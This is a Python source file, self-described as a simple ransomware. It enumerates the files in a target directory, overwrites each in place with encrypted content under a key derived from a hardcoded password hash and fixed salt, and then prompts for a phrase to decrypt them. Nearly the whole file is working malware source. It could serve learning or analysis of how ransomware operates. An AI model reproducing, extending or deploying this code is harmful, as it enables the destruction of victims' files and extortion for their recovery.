#!/usr/bin/env python3

"""Implementation of a simple ransomware with Python."""

import os
import sys
import base64
import logging
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC


def get_files(dir_name="target_dir"):
    """Get a list of files in a given directory.

        Parameters: 
            dir_name (str): Name of the target directory. Defaults to 'target_dir'.

        Returns:
            files (list): List of all files in the target directory.
    """
    if not os.path.isdir(dir_name):
        logging.critical("The directory given for query doesn't exist.")
        sys.exit(1)

    files = []
    for file_name in os.listdir(dir_name):
        # ignore this file
        if file_name == sys.argv[0]:
            continue

        file_path = os.path.join(dir_name, file_name)
        if os.path.isfile(file_path):
            files.append(file_path)

    return files


def encrypt(file_name, key):
    """Replace the file content with the encrypted content.

    Parameters:
        file_name (str): The path to the file to be encrypted.

        key (str): The key used to encrypt the data.

    Returns:
        file_name (str): The file path that is encrypted.
    """
    with open(file_name, "rb") as f:
        contents = f.read()
    
    encrypted_content = Fernet(key).encrypt(contents)

    with open(file_name, "wb") as f:
        f.write(encrypted_content)

    return file_name


def decrypt(file_name, key):
    """Replace the encrypted file with it's decrypted content.

    Parameters:
        file_name (str): The path to the file to be decrypted.

        key (str): The key used to decrypt the file, Obviousely 
            should be the one used for encrypting the file.

        Returns:
            file_name (str): The file path that is decrypted.
    """
    with open(file_name, "rb") as f:
        encrypted_content = f.read()

    decrypted_content = Fernet(key).decrypt(encrypted_content)

    with open(file_name, "wb") as f:
        f.write(decrypted_content)

    return file_name


def get_key(password, hashed=False):
    """Get a Fernet key using a password. 

    Generally we would have to store the key used for encryption to 
    decrypt the data. Here we add another layer obfuscation and increase 
    the computational cost of brute forcing through storing the hash of salt
    and the password used for generating the key.

    Parameters:
        password (str): The password used in Key Derivative Function (kdf).

        hashed (binary): Whether the provided password is hashed or not. Default to False.

    Returns:
        key (bytes): The Fernet key.
    """
    salt = b"\xcd\xfb\xeb\x11T\x00\xce\x0f\x19\xd5\xf8\xc4 0\xc0\xbd"

    backend = default_backend()

    if hashed:
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=32,
            salt=salt,
            iterations=390000,
            backend=backend
        )
        key = base64.urlsafe_b64encode(kdf.derive(password))

    else:
        digest = hashes.Hash(hashes.SHA256(), backend=backend)
        digest.update(bytes(password, "utf-8"))
     
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=32,
            salt=salt,
            iterations=390000,
            backend=backend
        )
        key = base64.urlsafe_b64encode(kdf.derive(digest.finalize()))

    return key


def infect():
    pass_hash = b"\x95/c\xc67\x1c6n\xe1\xf6\xe2\xf6\xb2\xff\xb2E\xad\x96\xb4\x86\x08\xfc\xa7\x84\xfeQ\x8f\x07EHxv"
    key = get_key(pass_hash, hashed=True)
    files = get_files()
    enc_files = []
    for f in files:
        ff = encrypt(f, key)
        enc_files.append(ff)
    password = input("Enter the phrase > ")
    key = get_key(password)
    dec_files = []
    for f in files:
        ff = decrypt(f, key)
        dec_files.append(ff)



